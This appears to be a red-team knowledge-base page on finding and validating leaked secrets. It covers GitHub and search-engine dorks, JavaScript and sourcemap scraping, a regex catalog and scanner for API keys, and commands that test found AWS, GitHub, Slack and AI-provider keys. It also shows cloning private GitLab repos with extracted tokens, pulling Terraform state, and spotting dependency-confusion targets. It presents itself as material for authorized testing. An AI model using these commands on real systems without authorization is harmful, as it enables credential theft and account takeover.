---
title: "Secret Hunting — Credential and Key Leak Discovery"
type: technique
tags: [credentials, dorking, git-poc, javascript, osint, post-exploitation, recon, secrets, web]
phase: recon
date_created: 2026-05-08
date_updated: 2026-06-18
sources: [git-claude-osint, payloadsallthethings-apikeys, git-One-Liners]

---

# Secret Hunting — Credential and Key Leak Discovery

## What It Is

**Secret hunting** is the systematic search for leaked credentials, API keys, tokens, and secrets in public sources: code repositories, JavaScript bundles, Postman workspaces, browser-indexed documents, and package registries. A single valid secret typically gives direct access to a cloud environment, CI/CD pipeline, or SaaS workspace — often without any exploitation.

See also: [[git-exposure]], [[aws-attacks]], [[cloud-iam-attacks]], [[identity-fabric]]

---

## How It Works

Developers accidentally commit secrets to Git, hard-code them in JS bundles, paste them into public Postman collections, or leak them through sourcemaps. Each source has a different search interface but the same core workflow: find → classify → validate read-only → scope → report.

**Confidence model:**
- **TENTATIVE** — regex pattern match in captured text; not yet confirmed live
- **FIRM** — pattern confirmed in a reachable source (GitHub file, live JS); not yet validated
- **CONFIRMED** — read-only validator returned success (e.g., `sts:GetCallerIdentity`, `auth.test`)

---

## Attack Phases

- **Recon** — primary; everything here is passive to medium detectability
- **Post-exploitation** — validated cloud key → IAM enumeration → pivot (see [[aws-attacks]], [[cloud-iam-attacks]])

---

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| GitHub token | Free personal access token for code search API (13 dorks) |
| Target identifiers | Domain, org name, product names, GitHub org slug |
| Authorization | Authorized engagement (bug bounty scope, red team ROE) |

---

## Methodology

### Step 1 — GitHub Code Search (13 Dork Templates)

```bash
T="target.com"        # full domain
TS="targetco"         # org/product stem

GITHUB_TOKEN="ghp_..."

# Loop over 13 dork queries
for q in \
  "\"${TS}\" filename:.env" \
  "\"${TS}\" filename:.env.example" \
  "\"${TS}\" filename:config" \
  "\"${TS}\" AWS_ACCESS_KEY_ID" \
  "\"${TS}\" AWS_SECRET_ACCESS_KEY" \
  "\"${TS}\" password" \
  "\"${TS}\" api_key" \
  "\"${TS}\" secret" \
  "\"${TS}\" \"authorization: Bearer\"" \
  "\"${TS}\" filename:id_rsa" \
  "\"${TS}\" filename:.git-credentials" \
  "\"${TS}\" filename:wp-config.php" \
  "\"${TS}\" filename:settings.py"; do
  echo "=== $q ==="
  curl -sk -H "Authorization: token $GITHUB_TOKEN" \
    "https://api.github.com/search/code?q=${q// /+}&per_page=20" \
    | jq -r '.items[] | "\(.repository.full_name) → \(.html_url)"'
  sleep 3   # GH API rate limit: 10 req/10s for code search
done
```

### Step 2 — JavaScript Deep Analysis

```bash
TARGET="https://app.target.com"

# Discover all JS files served by the app
curl -sk "$TARGET/" | grep -oE 'src="[^"]*\.js[^"]*"' | tr -d '"' | sed 's/src=//'

# For each JS file: check for sourcemap + run secret scan
for js_path in $(curl -sk "$TARGET/" | grep -oE 'src="[^"]*\.js[^"]*"' | tr -d '"' | sed 's/src=//'); do
  js_url="${TARGET}/${js_path#/}"
  
  # 1. Check for sourcemap (HIGH finding if accessible)
  MAP_STATUS=$(curl -sk -m 10 -o /dev/null -w '%{http_code}' "${js_url}.map")
  [ "$MAP_STATUS" = "200" ] && echo "SOURCEMAP EXPOSED: ${js_url}.map"
  
  # 2. Secret scan the JS body
  curl -sk "$js_url" | python3 secret_scan.py
done

# Probe common JS guess-paths
for path in /main.js /app.js /bundle.js /runtime.js /index.js /vendor.js \
            /_next/static/_buildManifest.js /_next/static/_ssgManifest.js \
            /static/js/main.js /static/js/bundle.js /assets/index.js; do
  STATUS=$(curl -sk -m 5 -I "${TARGET}${path}" -w '%{http_code}' -o /dev/null)
  [ "$STATUS" = "200" ] && echo "JS found: $path"
done
```

#### JS endpoint extraction regexes

Three tiers, run over every JS body and every `sourcesContent[]` blob from sourcemaps:

```python
import re

# Tier 1 — generic quoted paths (high recall, noisy)
tier1 = re.compile(r"""['"`](/[A-Za-z0-9_\-./{}\[\]?=&%:]+)['"`]""")

# Tier 2 — API-ish paths (filtered)
tier2 = re.compile(
    r"""['"`](/(?:api|graphql|gql|v\d+|swagger|openapi|rest|services|internal|admin|auth|oauth|"""
    r"""user|users|account|accounts|search|export|upload|file|files|download|webhook|hooks|"""
    r"""callback|admin)/[A-Za-z0-9_\-./{}\[\]?=&%:]+)['"`]"""
)

# Tier 3 — fully-qualified URLs
tier3 = re.compile(r"""\bhttps?://[A-Za-z0-9.\-]+\.[A-Za-z]{2,}(?::\d+)?[/A-Za-z0-9_\-./{}\[\]?=&%:#]*""")

# Internal-host leakage (MEDIUM finding per match)
rfc1918 = re.compile(
    r'\b(?:10\.(?:\d{1,3}\.){2}\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b'
)
internal_dns = re.compile(r'\b[A-Za-z0-9][A-Za-z0-9\-]{0,62}\.(?:internal|corp|lan|intranet|local|prod|staging|dev|qa|test)\b')
k8s_svc = re.compile(r'\b[A-Za-z0-9\-]+\.[A-Za-z0-9\-]+\.svc(?:\.cluster\.local)?\b')
```

### Step 3 — Postman Public Workspace Search

```bash
T="target.com"

# Search Postman public workspaces for target domain
curl -sk "https://www.postman.com/_api/ws/proxy" \
  -H 'Content-Type: application/json' \
  -d "{\"service\":\"search\",\"method\":\"POST\",\"path\":\"/search-all\",\"body\":{\"queryIndices\":[\"collaboration.workspace\",\"runtime.collection\",\"runtime.request\"],\"queryText\":\"${T}\",\"size\":100,\"from\":0,\"clientTraceId\":\"\",\"queryAllIndices\":false,\"domain\":\"public\"}}" \
  | jq '.data[] | {name: .document.name, slug: .document.slug, type: .document.documentType}'

# Walk found workspaces, extract env vars and requests, run secret scan
# Any API key, Bearer token, or Authorization header in a public workspace = CRITICAL
```

### Step 4 — Google / Bing Dork Corpus

```bash
TS="targetco"

# Code-hosting dorks
# site:github.com "${TS}" ".env"
# site:github.com "${TS}" "password"
# site:github.com "${TS}" "api_key"
# site:gitlab.com "${TS}" "password"
# site:bitbucket.org "${TS}" ".env"
# site:pastebin.com "${TS}" "password"

# File exposure dorks
# site:${T} filetype:env
# site:${T} filetype:json "api_key"
# site:${T} filetype:yaml "password"
# site:${T} filetype:sql
# site:${T} inurl:config

# Cloud storage dorks
# site:s3.amazonaws.com "${TS}"
# site:blob.core.windows.net "${TS}"
# site:storage.googleapis.com "${TS}"

# Collaboration platform dorks
# site:trello.com "${TS}" password
# site:notion.so "${TS}" password
# site:confluence.${T} password
# site:jira.${T} password

# Stack Exchange dorks (8 sites)
# site:stackoverflow.com "${TS}" api_key
# site:serverfault.com "${TS}" password
# site:superuser.com "${TS}" secret
```

### Step 5 — Secret Regex Catalog (48 patterns)

Key patterns to apply against any captured text:

```python
SECRET_PATTERNS = {
    # AWS
    "aws_access_key":     r'AKIA[0-9A-Z]{16}',
    "aws_secret_key":     r'(?i)aws.{0,20}secret.{0,20}[\'"][0-9a-zA-Z/+]{40}[\'"]',
    "aws_session_token":  r'ASIA[0-9A-Z]{16}',

    # GitHub
    "github_pat_classic": r'ghp_[0-9a-zA-Z]{36}',
    "github_pat_fine":    r'github_pat_[0-9a-zA-Z_]{82}',
    "github_oauth":       r'gho_[0-9a-zA-Z]{36}',

    # Slack
    "slack_token":        r'xox[baprs]-[0-9a-zA-Z\-]{10,48}',
    "slack_webhook":      r'https://hooks\.slack\.com/services/T[0-9A-Z]{8}/B[0-9A-Z]{8}/[0-9a-zA-Z]{24}',

    # Google
    "google_api_key":     r'AIza[0-9A-Za-z\-_]{35}',
    "google_oauth":       r'ya29\.[0-9A-Za-z\-_]+',
    "google_service_acct":r'"type":\s*"service_account"',

    # AI / LLM keys
    "anthropic_api_key":  r'sk-ant-[0-9a-zA-Z\-]{93}',
    "openai_api_key":     r'sk-[0-9a-zA-Z]{48}',
    "huggingface_token":  r'hf_[0-9a-zA-Z]{37}',
    "cloudflare_token":   r'(?i)cloudflare.{0,20}[0-9a-zA-Z]{37}',

    # Package registries
    "npm_token":          r'npm_[0-9a-zA-Z]{36}',
    "pypi_token":         r'pypi-AgEIcHlwaS5vcmc[0-9a-zA-Z\-_]+',
    "docker_hub":         r'(?i)docker.{0,20}password.{0,20}["\'][0-9a-zA-Z!@#$%^&*]{8,}["\']',

    # CI/CD / SaaS
    "atlassian_token":    r'(?i)atlassian.{0,20}[0-9a-zA-Z]{24}',
    "datadog_api":        r'(?i)datadog.{0,20}[0-9a-zA-Z]{32}',
    "sentry_dsn":         r'https://[0-9a-f]{32}@[a-z0-9.]+/\d+',
    "ngrok_token":        r'(?i)ngrok.{0,20}[0-9a-zA-Z_\-]{40}',
    "stripe_key":         r'(?:sk|pk)_(test|live)_[0-9a-zA-Z]{24,}',
    "twilio_sid":         r'AC[0-9a-f]{32}',

    # Generic
    "private_key_pem":    r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----',
    "bearer_token":       r'(?i)authorization:\s*bearer\s+[0-9a-zA-Z\-._~+/=]{20,}',
    "basic_auth_header":  r'(?i)authorization:\s*basic\s+[0-9a-zA-Z+/=]{8,}',
    "jwt":                r'eyJ[0-9a-zA-Z\-_]+\.eyJ[0-9a-zA-Z\-_]+\.[0-9a-zA-Z\-_]+',
    "password_in_url":    r'[a-z]+://[^:@\s]+:[^:@\s]+@[^\s]+',
}
```

### Step 6 — Read-Only Credential Validation

**Rules:** validate only with read-only endpoints. Never create, delete, send. Tag every validation with detectability and timestamp.

```bash
# AWS — sts:GetCallerIdentity (logs to CloudTrail; detectability: medium)
AWS_ACCESS_KEY_ID="AKIA..." AWS_SECRET_ACCESS_KEY="..." \
  aws sts get-caller-identity

# GitHub PAT — /user (detectability: low; no event emitted)
curl -sk -H "Authorization: token ghp_..." "https://api.github.com/user" | jq '{login, id, scopes: .X-OAuth-Scopes}'

# Slack — auth.test (detectability: low)
curl -sk "https://slack.com/api/auth.test?token=xoxb-..." | jq .

# Anthropic — /models (detectability: low)
curl -sk "https://api.anthropic.com/v1/models" \
  -H "x-api-key: sk-ant-..." -H "anthropic-version: 2023-06-01" | jq .

# OpenAI — /models (detectability: low)
curl -sk "https://api.openai.com/v1/models" \
  -H "Authorization: Bearer sk-..." | jq '.data[0].id'

# npm token — /whoami (detectability: low)
npm whoami --registry https://registry.npmjs.org --token npm_...

# Atlassian — /myself (detectability: low)
curl -sk "https://api.atlassian.com/me" \
  -H "Authorization: Bearer <atlassian_token>" | jq .

# DataDog — /validate (detectability: low)
curl -sk "https://api.datadoghq.com/api/v1/validate" \
  -H "DD-API-KEY: <key>" | jq .
```

**Post-validation (AWS — read-only scope enumeration):**

```bash
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."

# Who am I + attached policies
USER=$(aws sts get-caller-identity --query 'Arn' --output text | awk -F'/' '{print $NF}')
aws iam list-attached-user-policies --user-name "$USER"
aws iam list-user-policies --user-name "$USER"
aws iam list-groups-for-user --user-name "$USER"

# What can I do?
ARN=$(aws sts get-caller-identity --query 'Arn' --output text)
aws iam simulate-principal-policy \
  --policy-source-arn "$ARN" \
  --action-names s3:ListAllMyBuckets ec2:DescribeInstances iam:ListUsers \
                 secretsmanager:ListSecrets ssm:DescribeParameters \
                 lambda:ListFunctions

# Inventory (do NOT write)
aws s3 ls
aws secretsmanager list-secrets --query 'SecretList[*].Name'
aws ssm describe-parameters --query 'Parameters[*].Name'
aws lambda list-functions --query 'Functions[*].FunctionName'
```

### Package Manager Virtual Store Path Tokens

When npm or pnpm installs a private package from an authenticated registry, the full install URL (including the auth token) is encoded into the virtual store directory name:

```
node_modules/.pnpm/pkg-name@https+++registry.gitlab.com+api+v4+projects+ORG%2FREPO+repos_TOKEN/
```

The `+` characters replace `://` and `/`; `%2F` is `/`. This directory name is captured verbatim by webpack as the module path for every file in that package, and then written into the `.js.map` source map file. Any internet user who can fetch the source map can extract the token.

**Registry token types by prefix:**

| Prefix | Registry | Token type |
|--------|----------|-----------|
| `repos_` | GitLab | Deploy token (read: clone, registry pull) |
| `glpat-` | GitLab | Personal Access Token |
| `ghp_` | GitHub | Personal Access Token |
| `github_pat_` | GitHub | Fine-grained PAT |
| Long base64 string | AWS CodeArtifact | Temporary auth token |

**Detection (from an extracted source map):**

```bash
# Search the raw map JSON for encoded HTTPS paths containing tokens
grep -ohP 'node_modules/\.pnpm/[^\s"]+https\+\+\+[^\s"]+' vendor.map | sort -u

# Parse and decode each path
python3 << 'EOF'
import re, urllib.parse

with open('vendor.map') as f:
    data = f.read()

pattern = r'node_modules/\.pnpm/([^"\s]+https\+\+\+[^"\s/]+)'
for m in set(re.findall(pattern, data)):
    decoded = m.replace('+++', '://').replace('+', '/').replace('%2F', '/')
    print(decoded)
EOF
```

**Validate each token (read-only):**

```bash
TOKEN="repos_abc123..."

# GitLab deploy token -- test all three header variants
curl -s "https://gitlab.com/api/v4/projects/ORG%2FREPO" -H "Deploy-Token: $TOKEN" | jq '.name'
curl -s "https://gitlab.com/api/v4/projects/ORG%2FREPO" -H "PRIVATE-TOKEN: $TOKEN" | jq '.name'

# Git clone is the highest-impact read-only PoC (captures all history)
GIT_TERMINAL_PROMPT=0 git clone \
  "https://gitlab-ci-token:${TOKEN}@gitlab.com/ORG/REPO.git" /tmp/repo-test 2>&1 | tail -3

# GitHub PAT
curl -s "https://api.github.com/user" -H "Authorization: token $TOKEN" | jq '.login'
```

**Root cause and remediation:** the lock file (`pnpm-lock.yaml`, `package-lock.json`) stores the authenticated install URL for every private package. Developers should use `${ENV_VAR}` interpolation in `.npmrc` rather than embedding the token in the package URL in `package.json` or the lock file. Audit `pnpm-lock.yaml` for `https://` entries containing token-like strings.

See also [[javascript-source-map-exploitation]] for how to extract source maps that contain these paths.

---

### Step 7 - IaC / State File Exposure

Infrastructure-as-code state stores secrets in **plaintext** (DB passwords, cloud keys, private keys, tokens). Exposed state = instant high/critical. State leaks via public S3 buckets, git repos, CI artifacts, and web roots.

```bash
# Terraform state in the web root / artifacts (plaintext secrets)
for p in terraform.tfstate terraform.tfstate.backup .terraform/terraform.tfstate \
         terraform.tfvars infra/terraform.tfstate; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://TARGET/$p"; done
# parse a recovered state for secrets
curl -s https://TARGET/terraform.tfstate | jq -r '.. | .attributes? // empty' | grep -iE 'password|secret|key|token'

# Public S3 / bucket state (very common)
aws s3 ls s3://company-terraform-state --no-sign-request
aws s3 cp s3://company-tfstate/env/terraform.tfstate - --no-sign-request | jq

# git history / repos -- dorks:
# filename:terraform.tfstate ; "terraform.tfstate" password ; extension:tfstate
```

Other IaC/state sinks: `*.tfvars`, Pulumi `Pulumi.*.yaml` + state, CloudFormation params, Ansible `group_vars`/unvaulted `vault.yml`, `.terraform/` provider cache, serverless `.serverless/`, Terragrunt. Also grep CI logs (`TF_LOG`, `terraform apply` output) for leaked values. Validate found creds read-only (Step 6); feed cloud keys to `hunt-cloud`.

## Key Payloads / Examples

### stdlib-only secret scanner (Python 3, no deps)

```python
#!/usr/bin/env python3
"""Scan stdin or a file for secrets. JSONL output."""
import re, sys, json, hashlib, datetime

PATTERNS = {
    "aws_access_key":  r'AKIA[0-9A-Z]{16}',
    "github_pat":      r'gh[pousr]_[0-9a-zA-Z]{36,82}',
    "slack_token":     r'xox[baprs]-[0-9a-zA-Z\-]{10,48}',
    "anthropic_key":   r'sk-ant-[0-9a-zA-Z\-]{93}',
    "openai_key":      r'sk-[0-9a-zA-Z]{48}',
    "npm_token":       r'npm_[0-9a-zA-Z]{36}',
    "private_key":     r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----',
    "bearer_header":   r'(?i)authorization:\s*bearer\s+[0-9a-zA-Z\-._~+/=]{20,}',
    "jwt":             r'eyJ[0-9a-zA-Z\-_]+\.eyJ[0-9a-zA-Z\-_]+\.[0-9a-zA-Z\-_]+',
    "google_api_key":  r'AIza[0-9A-Za-z\-_]{35}',
    "stripe_key":      r'(?:sk|pk)_(test|live)_[0-9a-zA-Z]{24,}',
}

text = sys.stdin.read()
for name, pattern in PATTERNS.items():
    for m in re.finditer(pattern, text):
        print(json.dumps({
            "type": name,
            "value": m.group()[:80],
            "sha256": hashlib.sha256(m.group().encode()).hexdigest()[:16],
            "offset": m.start(),
            "ts": datetime.datetime.utcnow().isoformat() + "Z"
        }))
```

Usage: `curl -sk https://app.target.com/main.js | python3 secret_scan.py`

---

### Cloud Service Environment Variable Hunting

Beyond EC2 IMDS, AWS injects credentials and secrets as env vars across multiple compute services. After any initial access to a cloud workload, enumerate all env var sources:

```bash
# AppRunner, ECS, Lambda, Lightsail, SageMaker — via API (requires read permission)
aws apprunner list-services | jq -r '.ServiceSummaryList[].ServiceArn' | while read arn; do
  aws apprunner describe-service --service-arn "$arn" \
    --query 'Service.SourceConfiguration.ImageRepository.ImageConfiguration.RuntimeEnvironmentVariables'
done

# SageMaker notebooks (often have S3/DB credentials as env vars)
aws sagemaker list-notebook-instances --query 'NotebookInstances[*].NotebookInstanceName' --output text | \
  tr '\t' '\n' | xargs -I{} aws sagemaker describe-notebook-instance --notebook-instance-name {} \
  --query '[NotebookInstanceName,KmsKeyId]'

# CodeBuild: build environment variables (frequent CI secret storage)
aws codebuild batch-get-projects \
  --names $(aws codebuild list-projects --query 'projects' --output text | tr '\t' ' ') \
  --query 'projects[*].[name,environment.environmentVariables]' --output json
```

### Dependency Confusion Detection

**Mechanism:** A package manager (npm, pip, gem, NuGet) resolves package names against public registries before private registries. If an attacker publishes a package to npm/PyPI with a name matching an internal private package, the package manager may pull the malicious public version instead.

```bash
# Extract internal package names from discovered package.json files
echo target.com | gau | grep 'package.json$' | httpx -silent -status-code -mc 200 | \
  awk '{print $1}' | xargs -I{} sh -c \
  'curl -sk {} | python3 -c "import sys,json; d=json.load(sys.stdin); print(list((d.get(\"dependencies\",{})|d.get(\"devDependencies\",{})).keys()))"'

# Check if internal package names are claimable on npm
# Download any found package.json files and scan with confused:
mkdir -p downloaded_json && while read url; do
  wget -q "$url" -O "downloaded_json/$(basename $(dirname $url))-package.json"
  scan=$(confused -l npm "downloaded_json/$(basename $(dirname $url))-package.json")
  echo "$scan" | grep -q "Issues found" && echo "Dep confusion candidate: $url"
done < <(cat urls.txt | grep 'package.json')
```

**Direct `confused` invocation** (install: `go install github.com/visma-prodsec/confused@latest`):

```bash
# Scan a known package manifest file for claimable names
confused -l npm path/to/package.json
confused -l pip path/to/requirements.txt
confused -l gem path/to/Gemfile
confused -l nuget path/to/packages.config

# One-liner: enumerate, download, and scan all discovered package.json files
echo target.com | gau | grep 'package\.json$' | httpx -silent -mc 200 -o live-pkgjson.txt
while read url; do
  f="tmp-$(echo $url | md5sum | cut -c1-8).json"
  curl -sk "$url" -o "$f" && confused -l npm "$f"
done < live-pkgjson.txt
```

**Signal:** `confused` prints `Issues found` and lists package names that exist internally but are unclaimed on the public registry. Each is a candidate for a supply-chain confusion attack.

**Severity:** CRITICAL if a publishable name can execute code during `npm install` (via `postinstall` script). Scope depends on program rules; many programs reward supply-chain findings even without actual exploitation.

### Favicon Hash Fingerprinting

Favicons often reveal the underlying technology stack or product. The MurmurHash of a favicon matches values in Shodan's `http.favicon.hash` index, enabling you to find all internet-facing instances of a given product or framework regardless of hostname.

```bash
# Compute MurmurHash3 of a target's favicon (requires mmh3: pip install mmh3)
curl -sk https://target.com/favicon.ico | \
  python3 -c "import mmh3,base64,sys; print(mmh3.hash(base64.encodebytes(sys.stdin.buffer.read())))"

# Or fetch via the kmsec API helper
curl -s "https://favicon-hash.kmsec.uk/api/?url=https://target.com/favicon.ico" | jq

# Shodan search once you have the hash value
# shodan search "http.favicon.hash:<VALUE>"
```

**Bug bounty use case:** hash the favicon of a login panel or internal tool, then Shodan-search for the same hash. Assets found this way often belong to the same organisation and may be in scope (or confirm scope expansion). Cross-reference with ASN to filter noise.

---

## Bypasses and Variants

### Package registry leak hunting

```bash
# npm packages published by target org
curl -sk "https://registry.npmjs.org/-/org/${ORG_SLUG}/package" | jq '.[]'

# npm audit for target package (may expose secrets in README/metadata)
npm pack <package-name> --dry-run

# PyPI target packages
curl -sk "https://pypi.org/pypi/<package>/json" | jq '.info | {author, author_email, home_page}'

# Docker Hub (search for target org images)
curl -sk "https://hub.docker.com/v2/repositories/${ORG_SLUG}/?page_size=100" | jq '.results[].name'
```

### Stack Exchange OSINT sweep (8 sites)

Search for the target name across: `stackoverflow.com`, `serverfault.com`, `superuser.com`, `security.stackexchange.com`, `devops.stackexchange.com`, `softwareengineering.stackexchange.com`, `unix.stackexchange.com`, `dba.stackexchange.com`. Developers often post debugging snippets with real credentials redacted incompletely.

---

## Detection and Defence

| Control | What it covers |
|---------|---------------|
| GitHub Secret Scanning (partner program) | Auto-revokes many key types on push (AWS, Anthropic, Stripe) |
| AWS GuardDuty `UnauthorizedAccess` | Detects validated-but-unfamiliar-location key use |
| CloudTrail `sts:GetCallerIdentity` alert | Detects validation step |
| Pre-commit hooks (`detect-secrets`, `trufflehog`) | Prevents commit of secrets |
| `GITHUB_TOKEN` scoped to minimum permissions | Reduces blast radius if exposed |
| Secrets rotation (short TTL) | Renders leaked long-lived keys worthless quickly |

---

## Tools

| Tool | Purpose |
|------|---------|
| [TruffleHog](https://github.com/trufflesecurity/trufflehog) | Git history + live secret scanner |
| [Gitleaks](https://github.com/gitleaks/gitleaks) | SAST secret scanner for repos |
| [detect-secrets](https://github.com/Yelp/detect-secrets) | Pre-commit secret baseline |
| `secret_scan.py` | stdlib-only scanner in `raw/git/Claude-OSINT/skills/offensive-osint/scripts/` |
| [GitDorker](https://github.com/obheda12/GitDorker) | Automates GitHub code-search dorks |
| GitHub code search | Manual dork queries via browser / API |
| [[burp-suite]] | Intercept + scan JS/API responses for secrets |
| `trivy` | General purpose vulnerability and misconfiguration scanner (searches for API keys) |
| `badsecrets` / `crapsecrets` | Libraries for detecting known or weak secrets |
| `SignSaboteur` | Burp Suite extension for editing/signing web tokens |
| `secrets-patterns-db` | Database of regex patterns for detecting secrets |
| `keyhacks` | Repository of ways to validate leaked API keys |
| `KeyFinder` | Browser extension/tool to find keys while surfing |

**Nuclei Token Spraying:**
```bash
nuclei -t token-spray/ -var token=token_list.txt
```

---

## Sources

- `raw/git/Claude-OSINT/` — ElementalSoul claude-osint skills v2.1 (offensive-osint §17–19, §23–24; example 04-secret-hunting.md)
